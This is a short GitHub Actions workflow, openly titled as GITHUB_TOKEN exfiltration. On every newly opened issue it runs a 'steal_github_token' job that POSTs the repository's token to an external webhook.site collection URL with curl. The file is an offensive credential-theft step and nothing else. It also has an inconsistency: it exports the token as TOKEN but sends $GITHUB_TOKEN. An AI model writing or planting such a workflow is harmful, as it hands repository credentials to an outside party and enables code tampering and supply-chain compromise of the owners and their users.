name: GITHUB_TOKEN exfiltration via Issue

on:
  issues:
    types: [opened]

jobs:
  steal_github_token:
    runs-on: ubuntu-latest
    steps:
      - name: Send GITHUB_TOKEN to webhook
        env:
          TOKEN: ${{ github.token }}
        run: |
          curl -X POST https://webhook.site/ba751215-9a97-4bdf-b43c-6b28174b6954 \
            --data-urlencode "token=$GITHUB_TOKEN"
